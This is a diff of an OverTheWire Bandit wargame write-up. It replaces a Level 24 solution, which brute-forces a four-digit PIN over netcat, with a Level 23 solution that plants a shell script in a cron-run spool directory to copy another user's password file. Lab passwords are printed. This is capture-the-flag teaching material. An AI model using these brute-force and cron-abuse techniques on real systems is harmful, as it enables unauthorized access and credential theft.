@@ -1,16 +1,14 @@
-<h1>Bandit 24</h1>
+<h1>Bandit 23</h1>
 
 <h2 id="level-goal">Level Goal</h2>
 <p>A program is running automatically at regular intervals from
 <strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for
 the configuration and see what command is being executed.</p>
 
-<p><strong>NOTE:</strong> This level requires you to create your own first
-shell-script. This is a very big step and you should be proud of
-yourself when you beat this level!</p>
-
-<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once
-executed, so you may want to keep a copy around…</p>
+<p><strong>NOTE:</strong> Looking at shell scripts written by other people is a
+very useful skill. The script for this level is intentionally made
+easy to read. If you are having problems understanding what it does,
+try executing it to see the debug information it prints.</p>
 
 <h2 id="commands-you-may-need-to-solve-this-level">Commands you may need to solve this level</h2>
 <p>cron, crontab, crontab(5) (use “man 5 crontab” to access this)</p>
@@ -19,42 +17,55 @@ executed, so you may want to keep a copy around…</p>
 <h1>Solution</h1>
 
 ```
-user@host:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
+user@host:~$ ssh bandit23@bandit.labs.overthewire.org -p 2220
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit23@bandit:~$ ls
+bandit23@bandit:~$ ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+If we have a file that is owned by ourself in that directory, it will be executed!
+
+```
+bandit23@bandit:~$ mkdir /tmp/mytmp
+bandit23@bandit:~$ vim /tmp/mytmp/runme.sh
+  #!/bin/bash
+  cat /etc/bandit_pass/bandit24 >> /tmp/mytmp/psswrd.txt
+bandit23@bandit:~$ touch /tmp/mytmp/psswrd.txt
+bandit23@bandit:~$ chmod 777 -R /tmp/mytmp/
+bandit23@bandit:~$ cp /tmp/mytmp/runme.sh /var/spool/bandit24/runme.sh
+```
+
+And after waiting a minute:
+
+```
+bandit23@bandit:~$ cat /tmp/mytmp/psswrd.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-
-bandit24@bandit:~$ nc localhost 30002
-I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111
-Wrong! Please enter the correct pincode. Try again.
-^C
 ```
 
-Let's make a script that automatically tries all combinations.
-
-```
-bandit24@bandit:~$ mkdir /tmp/scripts/
-bandit24@bandit:~$ vim /tmp/myscripts/runme.sh
-  1 #!/bin/bash
-  2 for i in {0000..9999}; do
-  3     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/myscripts/combinations.txt
-  4 done
-bandit24@bandit:~$ chmod -x /tmp/myscripts/runme.sh
-bandit24@bandit:~$ touch /tmp/myscripts/combinations.txt
-bandit24@bandit:~$ ls /tmp/myscripts/
-combinations.txt  runme.sh
-bandit24@bandit:~$ bash /tmp/myscripts/runme.sh
-bandit24@bandit:~$ cat /tmp/myscripts/combinations.txt | nc localhost 30002
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-...
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-Correct!
-The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-
-Exiting.
-```
-
-<a href="bandit23.md">Level 23</a>
-<a href="bandit25.md">Level 25</a>
+<a href="bandit22.md">Level 22</a>
+<a href="bandit24.md">Level 24</a>
